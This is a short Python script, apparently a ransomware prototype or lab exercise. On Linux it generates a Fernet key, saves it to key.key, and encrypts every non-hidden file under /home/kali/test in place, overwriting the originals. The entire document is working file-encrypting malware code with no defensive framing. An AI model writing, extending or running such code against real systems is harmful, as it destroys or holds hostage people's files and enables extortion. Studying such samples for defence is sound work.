#!/bin/python3
import os
import platform
from cryptography.fernet import Fernet

def check_os():
    return platform.system()

check_os()


def Linux():
    if check_os() == "Linux":
        folder = "/home/kali/test"

        key = Fernet.generate_key()
        with open("key.key","wb") as f: # create key
            f.write(key)

        fernet = Fernet(key)
        print(" +] Done key creat")

        for root,dirs,files in os.walk(folder):
            for file in files:
                path_file = os.path.join(root,file)

                if not file.startswith("."): # remove file hidden
                    with open(path_file,"rb") as f: # enc data
                        data = f.read()
                        enc = fernet.encrypt(data)

                    with open(path_file ,"wb") as f: # write enc data in the same file
                        f.write(enc)
                        print(f" +] Done file {file} encrypted !!")


Linux()
